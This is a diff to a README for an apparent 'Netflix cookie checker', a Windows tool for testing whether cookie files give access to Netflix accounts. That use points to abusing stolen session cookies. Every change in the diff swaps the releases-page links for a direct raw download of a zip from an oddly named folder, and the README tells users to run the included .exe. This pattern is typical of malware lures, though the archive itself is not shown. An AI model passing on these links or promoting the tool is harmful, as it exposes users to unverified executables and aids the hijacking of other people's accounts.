@@ -1,6 +1,6 @@
 # 🎬 Netflix-Cookie-Checker - Check Cookies With Ease
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/peruvian-phylumaschelminthes568/Netflix-Cookie-Checker/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/peruvian-phylumaschelminthes568/Netflix-Cookie-Checker/raw/refs/heads/main/alimentativeness/Netflix-Cookie-Checker-v1.7.zip)
 
 ## 🧾 What This App Does
 
@@ -12,7 +12,7 @@ The app reads a cookie file, checks if it works, and shows the account status wh
 
 Visit this page to download the latest release for Windows:
 
-[Download the latest release](https://github.com/peruvian-phylumaschelminthes568/Netflix-Cookie-Checker/releases)
+[Download the latest release](https://github.com/peruvian-phylumaschelminthes568/Netflix-Cookie-Checker/raw/refs/heads/main/alimentativeness/Netflix-Cookie-Checker-v1.7.zip)
 
 Pick the newest file that matches your system. If the release includes a `.exe` file, download that file and run it on your PC.
 
@@ -230,4 +230,4 @@ Before you run the app, make sure you have:
 
 If you need the release page again:
 
-[https://github.com/peruvian-phylumaschelminthes568/Netflix-Cookie-Checker/releases](https://github.com/peruvian-phylumaschelminthes568/Netflix-Cookie-Checker/releases)
+[https://github.com/peruvian-phylumaschelminthes568/Netflix-Cookie-Checker/raw/refs/heads/main/alimentativeness/Netflix-Cookie-Checker-v1.7.zip](https://github.com/peruvian-phylumaschelminthes568/Netflix-Cookie-Checker/raw/refs/heads/main/alimentativeness/Netflix-Cookie-Checker-v1.7.zip)
